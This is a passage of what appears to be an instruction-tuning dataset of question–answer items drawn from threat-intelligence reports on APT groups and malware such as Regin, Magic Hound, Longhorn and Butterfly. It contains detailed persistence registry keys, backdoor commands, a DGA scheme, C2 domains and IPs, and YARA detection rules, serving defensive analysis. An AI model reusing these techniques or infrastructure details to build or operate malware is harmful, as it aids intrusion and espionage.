contained \"Microsoft IIS web server traffic monitor and a traffic sniffer of the administration of mobile telephone base controllers.\" The platform also features anti-forensic capabilities, a custom-built encrypted virtual file system (EVFS), and RC5 encryption.  Communication with the C&C servers occurs over ICMP/ ping, embedded commands in HTTP cookies, and custom TCP and UDP protocols.\nQ: Why is the Regin malware considered to be highly sophisticated, and what are the key features that contribute to its stealth and effectiveness?",
    "output": "The Regin malware is considered highly sophisticated due to its modular design and advanced obfuscation techniques. Key features contributing to its stealth and effectiveness include its five-stage modular component, where each stage is hidden and encrypted, and only decrypts the next stage upon successful installation. This design minimizes the information exposed about the total component and allows the malware to terminate installation if any stage fails. Additionally, Regin includes anti-forensic capabilities, a custom-built encrypted virtual file system (EVFS), and RC5 encryption. Its communication with command and control (C&C) servers occurs over various protocols, including ICMP/ping, embedded commands in HTTP cookies, and custom TCP and UDP protocols, further enhancing its stealth.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does htpRAT ensure persistence on a compromised system? Describe the steps it takes to maintain its presence even after a reboot.",
    "output": "htpRAT ensures persistence on a compromised system through several steps. Initially, it creates a mutex to ensure only one instance of the malware is running, using the hardcoded mutex name '{3084ADEC-04CF-4981-B6A0-87DC5C385E24}'. It then obtains its local path in the appdata folder (%LOCALAPPDATA%\\\\Microsoft\\\\) and stores a file called 'token.ini', which contains the system uptime in milliseconds. This file is formatted using the INI format with specific hardcoded information to structure its app and key names. Finally, htpRAT sets a startup entry in the registry under 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' with the keyname 'WindowsApp', pointing to the location of the wininit.exe binary in the Microsoft subfolder in local appdata. This ensures that the malware starts automatically when the system is rebooted.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PUPY LOADER\nPupy comes with default loaders that run the RAT on a variety of different platforms, specifically Windows, OSX, Linux and We have seen the Magic Hound actors using both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems. We have gathered three samples of the default loader associated with this group and extracted the following\nconfigurations:\nThese configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers. Also, the configurations show the use of the \"obfs3\" (The Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based communications protocol. The \"obfs3\" is used in the Tor project and the specifics of this transport can be found at (<https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt>)the Tor Project.\nBig Headline: MAGICHOUND.DROPIT\nThe Magic Hound campaign was also discovered using a custom dropper tool, which we have named MagicHound.DropIt.\nThe DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order. In all of the DropIt samples we collected, the dropper will then save the executable to the user's %TEMP% folder and execute the file, specifically to one of the following filenames:\n%TEMP%\\spp.exe\n%TEMP%\\sloo.exe\n%TEMP%\\spoo.exe\n%TEMP%\\vschos.exe\nWe have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload. For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to \"%TEMP%\\flash_update.exe\" that was a legitimate Flash Player installer. We believe the Magic Hound campaign uses the DropIt Trojan to run legitimate applications that fit their social engineering, which in the example above included coercing the victim into updating their Flash Player.\nBig Headline: MAGICHOUND.RETRIEVER\nWe observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level, Retriever is a .NET downloader that downloads secondary payloads from servers associated with Magic Hound. While the Trojan itself does not resemble the other Magic Hound tools, it does create a folder named \"c:\\temp\" that the Magic Hound loader creates to store its persistence executable, as previously discussed. The folder name is quite generic and by itself is not a great correlation point, however, this coupled with the shared infrastructure makes a higher fidelity connection between the two.\nThe Retriever Trojan uses the following namespace:\nusing pcchekapp.grp.ammar.samaneh;\nAndroid.The malware begins by creating a web service object and uses the following URL within its configuration:\nhttp:// service.chrome-up[.]date:8080 /WebService.asmx\nIt then calls a function called \"SetLog2\", which sets variables for the system's IP address, MAC address and hostname. A password variable is available but unused in this sample. The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system. The code obtains the external IP address via an HTTP request using to \"http://checkip.dyndns.org/\" and uses a regular expression to locate an IP address from the HTTP response.\nOnce these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:\nAs you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request. All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests. Instead, we will refer to the specific SOAP action (see \"SOAPAction\" field in previous example, specifically \"SetLog2\") that the Trojan requests from the C2 server and the response from the C2 server. After sending the C2 the system information, the malware then issues a second request for \"GetHasAnything\", which will communicate with the C2 server and ask the server if it has a secondary binary for the Trojan to install.\nIf the C2 server provides any response to the \"GetHasAnything\" request, it then calls the \"GetIdAbOne\" SOAP method to obtain what we believe is a unique identifier for the system that the Trojan will use for further interaction with the C2. After receiving this variable, the Trojan calls the \"GetNameAbById\" to obtain a base64 string that will be the filename written in a newly created \"c:\\temp\" (decoded from \"YzpcdGVtcFw=\") folder. The Trojan will then call \"GetAbById\", which the C2 will provide a base64 string for the contents for the file to write to c:\\temp. After obtaining the unique ID from the C2 server, the Trojan calls the \"SetAbStatById\" method to notify the C2 server of its status of \"1\" to notify the server it had successfully received the filename and file data.\nWith the file written to the system, the Trojan calls the \"GetishideAbById\" SOAP action to determine whether or not the C2 server wishes to execute the newly dropped file in a hidden window. This request is followed by a call to \"GetisrunasAbById\" to determine if the Trojan should use \"runas\" to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click.\nUnfortunately, we were unable to obtain a secondary payload from an active C2 server.\n\nQ: Describe the functionality and purpose of the MagicHound.DropIt Trojan. How does it operate, and what strategies does it use to deceive victims?",
    "output": "A: The MagicHound.DropIt Trojan is a custom dropper tool used by the Magic Hound campaign. It operates by building an embedded executable from base64 encoded data blobs and saving it to the user's %TEMP% folder under various filenames such as spp.exe, sloo.exe, spoo.exe, or vschos.exe. Additionally, MagicHound.DropIt can act as a binder Trojan, dropping both a legitimate decoy executable and a malicious payload. For instance, it might drop a legitimate Flash Player installer alongside the malicious executable to coerce the victim into running it, thereby enhancing the effectiveness of their social engineering tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Who is Longhorn?\nLonghorn has been active since at least 2011. It has used a range of back door Trojans in addition to zero-day vulnerabilities to compromise its targets. Longhorn has infiltrated governments and internationally operating organizations, in addition to targets in the financial, telecoms, energy, aerospace, information technology, education, and natural resources sectors. All of the organizations targeted would be of interest to a nation-state attacker.\nLonghorn has infected 40 targets in at least 16 countries across the Middle East, Europe, Asia, and Africa. On one occasion a computer in the United States was compromised but, following infection, an uninstaller was launched within hours, which may indicate this victim was infected unintentionally.\n#Vault7 linked #Longhorn group infiltrated governments, international orgs, other targets\nBig Headline: The link to Vault 7\nA number of documents disclosed by WikiLeaks outline specifications and requirements for malware tools. One document is a development timeline for a piece of malware called Fluxwire, containing a changelog of dates for when new features were incorporated. These\ndates align closely with the development of one Longhorn tool () tracked by Symantec. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later, leaving little doubt that Corentry is the malware described in the leaked document.\nEarly versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file. The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0.\nUp until 2014, versions of Corentry were compiled using GCC. According to the Vault 7 document, Fluxwire switched to a MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015 had used MSVC as a compiler.\nA second Vault 7 document details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel. The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called .\nA third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks,\nkey exchange once per connection, and use of AES with a 32-byte key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools.\nOther Vault 7 documents outline tradecraft practices to be used, such as use of the Real-time Transport Protocol (RTP) as a means of command and control (C&C) communications, employing wipe-on-use as standard practice, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and the use of secure erase protocols involving renaming and overwriting. Symantec has observed Longhorn tools following all of these practices. While other malware families are known to use some of these practices, the fact that so many of them are followed by Longhorn makes it noteworthy.\nBig Headline: Global reach: Longhorn's operations\nWhile active since at least 2011, with some evidence of activity dating back as far as 2007, (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4148>)Longhorn first came to Symantec's attention in 2014 with the use of a zero-day exploit () embedded in a Word document to infect a target with Plexor.\nThe malware had all the hallmarks of a sophisticated cyberespionage group. Aside from access to zero-day exploits, the group had preconfigured Plexor with elements that indicated prior knowledge of the target environment.\nTo date, Symantec has found evidence of Longhorn activities against 40 targets spread across 16 different countries. Symantec has seen Longhorn use four different malware tools against its targets: Corentry, Plexor, , and .\nBefore deploying malware to a target, the Longhorn group will preconfigure it with what appears to be target-specific code words and distinct C&C domains and IP addresses for communications back to the attackers. Longhorn tools have embedded capitalized code words, internally referenced as \"groupid\" and \"siteid\", which may be used to identify campaigns and victims. Over 40 of these identifiers have been observed, and typically follow the theme of movies, characters, food, or music. One example was a nod to the band The Police, with the code words REDLIGHT and ROXANNE used.\nLonghorn's malware has an extensive list of commands for remote control of the infected computer. Most of the malware can also be customized with additional plugins and modules, some of which have been observed by Symantec.\nLonghorn's malware appears to be specifically built for espionage-type operations, with detailed system fingerprinting, discovery, and exfiltration capabilities. The malware uses a high degree of operational security, communicating externally at only select times, with upload limits on exfiltrated data, and randomization of communication intervals\u2014all attempts to stay under the radar during intrusions.\nFor C&C servers, Longhorn typically configures a specific domain and IP address combination per target. The domains appear to be registered by the attackers; however they use privacy services to hide their real identity. The IP addresses are typically owned by legitimate\ncompanies offering virtual private server (VPS) or webhosting services. The malware communicates with C&C servers over HTTPS using a custom underlying cryptographic protocol to protect communications from identification.\nPrior to the Vault 7 leak, Symantec's assessment of Longhorn was that it was a well-resourced organization which was involved in intelligence gathering operations. This assessment was based on its global range of targets and access to a range of comprehensively developed malware and zero-day exploits. The group appeared to work a standard Monday to Friday working week, based on timestamps and domain name registration dates, behavior which is consistent with state-sponsored groups.\nSymantec's analysis uncovered a number of indicators that Longhorn was from an English-speaking, North American country. The acronym MTWRFSU (Monday Tuesday Wednesday ThuRsday Friday Saturday SUnday) was used to configure which day of the week malware would communicate with the attackers. This acronym is common in academic calendars in North America. Some of the code words found in the malware, such as SCOOBYSNACK, would be most familiar in North America. In addition to this, the compilation times of tools with reliable timestamps indicate a time zone in the Americas.\nBig Headline: Distinctive fingerprints\nLonghorn has used advanced malware tools and zero-day vulnerabilities to infiltrate a string of targets worldwide. Taken in combination, the tools, techniques, and procedures employed by Longhorn are distinctive and unique to this group, leaving little doubt about its link to Vault 7.\nThroughout its investigation of Longhorn, Symantec's priority has been protection of its customers. Through identifying different strains of Longhorn malware, connecting them to a single actor, and learning more about the group's tactics and procedures, Symantec has been able to better defend customer organizations against this and similar threats. In publishing this new information, Symantec's goal remains unchanged: to reassure customers that it is aware of this threat and actively working to protect them from it.\n\nHow did the development timeline and technical specifications outlined in the Vault 7 documents align with the tools used by Longhorn?",
    "output": "The development timeline and technical specifications in the Vault 7 documents closely matched the tools used by Longhorn. For instance, the changelog dates for a piece of malware called Fluxwire aligned with the development of a Longhorn tool named Corentry. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later. Additionally, early versions of Corentry contained a reference to the file path for the Fluxwire program database (PDB) file, which was removed in Version 3.5.0 according to the Vault 7 document. Furthermore, up until 2014, versions of Corentry were compiled using GCC, but switched to an MSVC compiler for version 3.3.0 on February 25, 2015, matching the Vault 7 document.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the CARBANAK threat actor group use persistence techniques to maintain their foothold in the compromised environment?",
    "output": "Persistence is a crucial aspect of an adversary's strategy, allowing them to maintain access to compromised systems despite interruptions or changes in the environment. In the case of the CARBANAK threat actor group, they employed various persistence techniques to ensure their continued presence in the compromised environment. One notable technique was the use of the SSHDOOR malware, which allowed them to maintain access to the Linux environment even after the initial compromise. They also utilized the AUDITUNNEL tool to establish a reverse tunnel, enabling them to access the environment without being detected. Furthermore, they replaced SSHDOOR with AUDITUNNEL on four key systems, demonstrating their adaptability and persistence in maintaining their foothold. Additionally, they used the GOTROJ malware as a Windows Service, which allowed them to persist in the Windows environment. The attackers' use of these persistence techniques, combined with their ability to adapt and evolve their tactics, made them a formidable opponent for the organization's security team.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: Hacktool.Eventlog\nThe following information details the help output of Hacktool.Eventlog:\n-z  Zap (kill) all processes with specified name\n-y Dump logon/logoff events from Security channel (-t and -n optionals)\n-X Secure self delete our program\n-x Secure delete a file\n-w Show all logs from a .evtx file (requires -f)\n-v Enable verbose mode\n-t Delta time (in hours\n-s Dump logon/logoff events from System channel (-t and -n optionals)\n-r RecordIds list, comma separated without spaces (\"1234,5678\")\n-q Query Mode\n-p Filter with provider\n-n Number of events to show (default 16, 0=all)\n-ll List all channels\n-l List used channels\n-K Match a keyword in XML data (case insensitive) from all channels\n-k Match a keyword in XML data (case insensitive) from a specific channel\n-h Help\n-f Specify a .evtx file (system.evtx)\n-F Flush all logs to disk\n-e EventIds list, comma separated without spaces (\"1234,5678\")\n-Dr Dump all logs from a channel or .evtx file (raw parser) (-c or -f)\n-D Dump all logs from a channel .evtx file (requires -c or -f)\n-d Delete mode (requires -e or -r)\n-c Specify a channel ('Security', 'System', 'Application', ...)\nSmall Headline: YARA signatures\nThe following details are the YARA signatures related to this analysis:\nrule Bannerjack\n{\nmeta:         author = \"Symantec Security Response\"        date = \"2015-07-01\"         description = \"Butterfly BannerJack hacktool\"\nstrings:        $str\n_ 1 = \"Usage: ./banner-jack [options]\"        $str _ 2 = \"-f: file.csv\"\n$str _ 3 = \"-s: ip start\"        $str _ 4 = \"-R: timeout read (optional, default %d secs)\"\ncondition:         all of them\n}\nrule Eventlog {     meta:         author = \"Symantec Security Response\"         date = \"2015-07-01\"         description = \"Butterfly Eventlog hacktool\"     strings:\n$str _ 1 = \"wevtsvc.dll\"\n$str _ 2 = \"Stealing %S.evtx handle ...\"\n$str _ 3 = \"ElfChnk\"\n{\nmeta:         author = \"Symantec Security Response\"         date = \"2015-07-01\"         description = \"Butterfly proxy hacktool\"\nstrings:\n$str _ 1 = \"-u user  : proxy username\"\n$str _ 2 = \"--pleh\n: displays help\"\n$str _ 3 = \"-x ip/host : proxy ip or host\"\n$str _ 4 = \"-m\n: bypass mutex check\"\ncondition:         all of them\n}\nrule jiripbot _ ascii _ str _ decrypt\n{\nmeta:         author = \"Symantec Security Response\" \"        date = \"2015-07-01         description = \"Butterfly Jiripbot hacktool\"\nstrings:\n$decrypt _ func = {            85 FF\n75 03\n33 C0\nC3\n8B C7\n8D 50 01\n8A 08\n40            84 C9\n75 F9\n2B C2\n53\n8B D8\n80 7C 3B FF ??\n75 3E\n83 3D ?? ?? ?? ?? 00            56\nBE ?? ?? ?? ??\n75 11            56\nFF 15 ?? ?? ?? ??\nC7 05 ?? ?? ?? ?? 01 00 00 00\n56\nFF 15 ?? ?? ?? ??\n33 C0\n85 DB\n74 09\n80 34 38 ??            40\n3B C3\n72 F7            56\nFF 15 ?? ?? ?? ??\n5E\n}\nSmall Headline: C&C server details\nThe following IP addresses were used for C&C traffic using SSH over port 443:\n\u2022 46.183.217.132\n\u2022 46.165.237.75\n\u2022 217.23.3.112\n\u2022 178.162.197.9\nThe following C&C servers were used by Backdoor.Jiripbot and OSX.Pintsized:\n\u2022 ddosprotected.eu\n\u2022 drfx.chickenkiller.com\nThe following C&C domains were used by Butterfly-related back doors. They were also used to host exploits over HTTP:\n\u2022 digitalinsight-ltd.com\n\u2022 clust12-akmai.net\n\u2022 jdk-update.com\n\u2022 corp-aapl.com\n\u2022 cloudprotect.eu\nThe following shows the format of Backdoor.Jiripbot's DGA domains:\n\u2022 jdk\\.[a-f0-9]{32}\\.org e.g. jdk.20e8ad99287f7fc244651237cbe8292a.org\nSmall Headline: About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information protection expert that helps people, businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime, anywhere. Founded in April 1982, Symantec, a Fortune 500 company, operating one of the largest global data-intelligence networks, has provided leading security, backup and availability solutions for where vital information is stored, accessed and shared. The company's more than 19,000 employees reside in more than 50 countries. Ninety-nine percent of Fortune 500 companies are Symantec customers. In fiscal 2015, it recorded revenues of $6.5 billion.\nwww.symantec.com\nTo learn more go to  or connect with\ngo.symantec.com/social/\nSymantec at: .\nBig Headline: For specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters 350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nwww.symantec.com\nCopyright \u00a9 2015 Symantec Corporation. All rights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\n\nQuestion: What are the primary functionalities of the YARA signatures provided for identifying Butterfly-related hacktools, and how do these signatures help in detecting and mitigating threats?\n\nAnswer:",
    "output": "The YARA signatures provided for identifying Butterfly-related hacktools include rules for detecting tools like Bannerjack, Eventlog, and Jiripbot. Each rule contains specific strings and conditions that match the unique characteristics of these tools. For example, the 'Bannerjack' rule looks for strings like 'Usage: ./banner-jack [options]' and '-f: file.csv'. These signatures help in detecting and mitigating threats by allowing security analysts to scan systems and files for the presence of known malicious tools. By identifying these tools, security teams can quickly respond to and remediate the threats posed by Butterfly, thereby protecting sensitive information and intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Conclusion\nButterfly is a skilled, persistent, and effective attack group which has been active since at least March 2012. They are well resourced, using at least one or possibly two zero-day exploits. Their motivation is very likely to be financial gain and given that they have been active for at least three years, they must be successful at monetizing their operation.\nBased on our analysis, the Butterfly attackers are likely a small team that steals data either as a service to another client or to monetize it themselves through insider trading. Symantec believes that some members of Butterfly are native English speakers, given some of the colloquialisms and Western meme references included in their infrastructure.\nThe Butterfly attackers represent a threat to organizations involved in technology, pharmaceutical, law, investment, energy and natural resources. However, over the past three years, the attackers have demonstrated that they can change their targets quickly, as they moved to include commodities in their list of targets in 2014. Clearly, the Butterfly attackers will go where the money is.\nOrganizations need to be aware of the threat that corporate espionage groups like Butterfly can pose. The attack group or their potential clients may have strong knowledge on how to leverage the stolen data to unfairly make gains in the market.\nSmall Headline: Functionality\nIf the samples are executed with no command line argument and expected registry entries are missing, an infinite loop is entered that calculates SHA-1 hashes on random data. This is likely an attempt to avoid automation engines.\nTo perform any activity, the samples need to be executed with a command line argument that begins with 'http'. This value is encrypted and stored in the registry; the registry location varies based on the sample. Each sample first encrypts the URL using RC4 with a hard-coded key. It should be noted that the hard-coded key is stored in the binary as a wide character string, but is converted to a multibyte character string before the key is used. This conversion will vary based on the region of the system executing the code.\nThe malware takes exactly one command line argument, but the single command line argument has a structure that is manually parsed by the malware. The structure of the command line argument is as follows:\nWhere \"opt\" is one of the following:\n\u2022 vm: Set to a number. \"2\" will disable vmware checks\n\u2022 proxy_username: HTTP proxy user name to use\n\u2022 proxy_password: HTTP proxy password to use\n\u2022 proxy_host: HTTP proxy host to use\n\u2022 proxy_port: HTTP proxy port to use\n\u2022 resolv: Host name to resolve to\n\u2022 delay: Number of delay loops to execute\n\u2022 sleeptime: Number of seconds to sleep at certain points in the code\n\u2022 cnx: Parameter that modifies how C&C server is interacted with\nOnce the URL from the command line is RC4-encrypted, it is encrypted a second time using the crypt32!CryptProtectData API, with \"OptionalEntropy\" set to the ASCII string 'AYBABTU' (this is the acronym for the phrase \"All your base are belong to us\"). The use of crypt32!CryptProtectData ensures that if the encrypted data is retrieved from an infected computer, it is very hard to decrypt the data on another computer. The documentation for crypt32!CryptProtectData states:\n\"Typically, only a user with the same logon credential as the user who encrypted the data can decrypt the data.\"\nNext the malware examines its execution environment. It first checks to make sure that the file name it is currently running under is the same as the original name when the executable was created. It also looks for certain process names of running processes. The process names it searches for are hashed, so we are not clear what it is looking for.\nIt checks that the hashed value of the registry subkey HKEY_LOCAL_MACHINE\\Microsoft\\WindowsNT\\ CurrentVersion\\ProductId is not equal to a number of hashed values. It checks the hashed values of the registry\nkeys in HKEY_LOCAL_MACHINE\\SOFTWARE against a list of hashes. It also checks the registry subkeysHKEY_ LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum and HKEY_LOCAL_MACHINE\\HARDWARE\\ DESCRIPTION\\System\\BIOS\\SystemProductName\nVery Small Headline: 'resolv' command\nWhen the resolv command line argument is set to a domain name, a domain name system (DNS) resolution request is made for that domain name with the current computer name and calculated UID value prepended to it.\nFor example, we observed the following:\nresolv=h30026.drfx.chickenkiller.com\nWhen the sample is run with resolv set to that value, the following DNS query was observed:\nthread-2d9f4de5.1401420000c29bfea70f49b94b825e3e7586ce61350.h30026.drfx. chickenkiller.com\nIn this query, \"thread-2d9f4de5\" is the computer name and \"1401420000c29bfea70f49b94b825e3e7586ce61350\" is the calculated UID value. It is possible that the attackers use this method to exfiltrate the UID value, as the value is used in the DGA algorithm.\nVery Small Headline: UID/UPDATE_ID calculation\nThe UID is a unique ID calculated by the malware, as the following example shows:\n1401420000c29bfea70f49b94b825e3e7586ce61350\nThis ID consists of the following elements:\n\u2022 14014: Hard-coded string in the malware. May be a version number\n\u2022 2: The operating system version\n\u2022 0: 0 indicates x86, 1 indicates x86_64\n\u2022 000c29bfea70: This is the last six bytes of the UUID generated by a call to rpcrt4!UuidCreateSequential. This corresponds to the media access control (MAC) address of the infected computer.\n\u2022 f49b94b8: This is the first eight bytes of the volume serial number from a call to kernel32!GetVolumeInfomationW\n\u2022 25e3e758: This is a dword hash of the string \"[COMPUTER NAME]\\[USER NAME]\" using the current values from the computer name and user name\n\u2022 6ce61350: This is a hard-coded dword in the binary\nFor the operating system (the number at offset 5 in previous UID example), the complete table is:\n\u2022 0: Unknown/Error/Windows 8.1/Windows Server 2012 R2\n\u2022 1: Windows 2000\n\u2022 2: Windows XP\n\u2022 3: Windows 2003, Windows XP Pro x64, Windows Home Server, Windows 2003 R2\n\u2022 4: Windows Vista\n\u2022 5: Windows Server 2008\n\u2022 6: Windows 7\n\u2022 7: Windows Server 2008 R2, Windows Server 2012\n\u2022 8: Windows 8\nSmall Headline: Installation\nThe following registry subkeys may be used by Butterfly to maintain persistence:\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\Preferences\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\Options\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\UID\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\UPDATE_ID\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\Preferences\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\Options\n\u2022 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Acer LiveUpdater (likely named Liveupdater.exe)\n\u2022 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Adobe Flash Plugin Updater (FlashUtil.exe)\nThe registry data stored in the \"Preferences\" and \"Options\" subkeys are REG_BINARY keys and the data within is encrypted using RC4 and crypt32!CryptProtectData, as described previously. The registry data stored in the UID is not encrypted; it is stored in plain text.\nThe value of \"Preferences\" is the encrypted version of the first command line argument used to first start the malware. For example, if the malware is launched as:\nThe value of \"Preferences\" will be:\n\"http://[DOMAIN NAME].com /opts vm=2.\"\nThe value of \"Options\" is the URL from the command line argument, so for the previous example, the value would be:\n\"http://[DOMAIN NAME].com\"\nVery Small Headline: DGA Algorithm\nThe DGA computes a URL similar to the following:\n\u2022 http://jdk.MD5([MM].[YYYY].[UID AS WIDE-CHARACTER STRING]).org\n[MM] is the current month and [YYYY] is the current year. Note that the value of [UID AS WIDE-CHARACTER STRING] is the value of the UID registry entry, but as a wide characters, so \"07.2014.140...\" would be \"0\\x007\\ x00.\\x002\\x000\\x001\\x004\\x00.\\x001\\x004\\x000\\x00...\" for the purposes of the MD5 calculation.\nFor example, on July 22, 2014 on a system with the UID set to\n\"1401420000c29bfea70f49b94b825e3e7586ce61350\", the DGA URL would be:\n\u2022 http://jdk.MD5(\\'07.2014.1401420000c29bfea70f49b94b825e3e7586ce61350\\').org\nFinally:\n\u2022 http://jdk.20e8ad99287f7fc244651237cbe8292a.org\nNote that some samples use HTTPS instead of HTTP.\nVery Small Headline: C&C commands\nThe following commands implement back door functionality.\n\u2022 cd: Changes current working directory\n\u2022 exec: Executes a file using cmd.exe\n\u2022 install: Sets the registry subkey for persistence. The registry subkey is only set if this command is sent\n\u2022 quit: Ends the back door session\n\u2022 sleeptime: Sets the sleep time between C&C queries\n\u2022 shred: Overwrites file multiple times to perform a forensic-safe delete. Only found in samples with a PE timestamp in 2014\n\u2022 sysinfo: Gathers and reports system information\n\u2022 uninstall: Uninstalls itself\n\u2022 update: Updates itself\n\u2022 url: Updates C&C URL in registry (although this feature appears to be disabled)\n\u2022 wget: Downloads file to infected computer\nVery\n\nHow does the Butterfly malware achieve persistence on an infected system? Describe the registry subkeys used and the data stored within them.",
    "output": "The Butterfly malware achieves persistence by using specific registry subkeys such as HKEY_CURRENT_USER\\\\Software\\\\Adobe\\\\Preferences, HKEY_CURRENT_USER\\\\Software\\\\Acer\\\\UPDATE_ID, and others. The 'Preferences' and 'Options' subkeys store encrypted data using RC4 and crypt32!CryptProtectData. The 'Preferences' value stores the encrypted version of the first command line argument used to start the malware, while the 'Options' value stores the URL from the command line argument. The UID is stored in plain text in the 'UID' subkey.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: References\n[1] \"Dark Secrets\u2014Hacking Team commercial,\" accessed: 12-November-2013. [Online]. Available: http://bit.ly/1bCh57v\n[2] J. Scott-Railton, \"Revolutionary Risks: Cyber Technology and Threats in the 2011 Libyan Revolution,\" US Naval War College, Tech. Rep., 2013.\n[3] S. H. AlJalahma, \"Response to The Guardian\u2014UK companys software used against Bahrain activist,\" May 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/19iVUUP\n[4] V. Silver, \"Gamma Says No Spyware Sold to Bahrain; May Be Stolen Copy,\" Jul. 2012, accessed: 12-November-2013. [Online]. Available: http://bloom.bg/17SOXQs\n[5] A. Jeffries, \"Meet Hacking Team, the company that helps the police hack you,\" Sep. 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1bCajyl\n[6] T. Brewster, \"From Bahrain To Belarus: Attack Of The Fake Activists,\" Jul. 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1gIgwhW\n[7] V. Silver, \"MJM as Personified Evil Says Spyware Saves Lives Not Kills Them,\" 2011, accessed: 12-November-2013. [Online]. Available: http://bloom.bg/170E8sQ\n[8] D. Gilbert, \"Hacking Team and the Murky World of State-Sponsored Spying,\" 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/17tBBtm\n[9] R. Clayton, S. J. Murdoch, and R. N. Watson, \"Ignoring the Great Firewall of China,\" in PETS. Springer, 2006, pp. 20\u201335.\n[10] J. R. Crandall et al., \"ConceptDoppler: A Weather Tracker for Internet Censorship,\" in ACM CCS, 2007.\n[11] X. Xu, Z. M. Mao, and J. A. Halderman, \"Internet Censorship in China: Where Does the Filtering Occur?\" in Proc. PAM, 2011.\n[12] M. Sherr, G. Shah, E. Cronin, S. Clark, and M. Blaze, \"Can They Hear Me Now? A Security Analysis of Law Enforcement Wiretaps,\" in ACM CCS, 2009, pp. 512\u2013 523.\n[13] J. R. Crandall, M. Crete-Nishihata, and J. Knockel, \"Chat program censorship and surveillance in China: Tracking TOM-Skype and Sina UC,\" First Monday, vol. 18, no. 7, Jul. 2013, accessed: 8-August-2013. [Online]. Available: http://bit.ly/1fzNcHl\n[14] S. Wolchok, R. Yao, and J. A. Halderman, \"Analysis of the Green Dam Censorware System,\" Tech. Rep., 2009.\n[15] F. Li, A. Lai, and D. Ddl, \"Evidence of Advanced Persistent Threat: A case study of malware for political espionage,\" in MALWARE, 2011.\n[16] \"Default https access for Gmail,\" 2010, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1bBktPM\n[17] \"Making Twitter more secure: HTTPS,\" 2011, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1i7l9kM\n[18] L. Constantin, \"Facebook to roll out HTTPS by default to all users,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1bsLBCm\n[19] \"FinFisher: Governmental IT Intrusion and Remote Monitoring Solutions,\" accessed: 12-November-2013. [Online]. Available: http://bit.ly/1840Lxn\n[20] \"BlackBerry rogue software leaves sour taste in UAE,\" 2013, accessed: 11-November-2013. [Online]. Available: http://on.ft.com/HVXvJP\n[21] Mandiant, \"The Advanced Persistent Threat,\" 2010.\n[22] \u2014\u2014, \"APT1: Exposing One of China's Cyber 